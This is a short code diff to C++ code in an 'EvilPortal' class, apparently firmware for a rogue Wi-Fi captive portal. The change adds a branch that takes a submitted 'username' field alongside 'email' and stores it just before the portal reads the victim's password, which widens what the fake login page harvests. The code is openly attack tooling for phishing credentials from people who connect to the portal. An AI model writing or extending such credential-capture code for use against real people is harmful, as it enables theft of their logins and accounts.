@@ -62,6 +62,11 @@ void EvilPortal::setupServer() {
       inputParam = "email";
       this->user_name = inputMessage;
       this->name_received = true;
+    } else if (request->hasParam("username")) {
+      inputMessage = request->getParam("username")->value();
+      inputParam = "username";
+      this->user_name = inputMessage;
+      this->name_received = true;
     }
 
     if (request->hasParam("password")) {
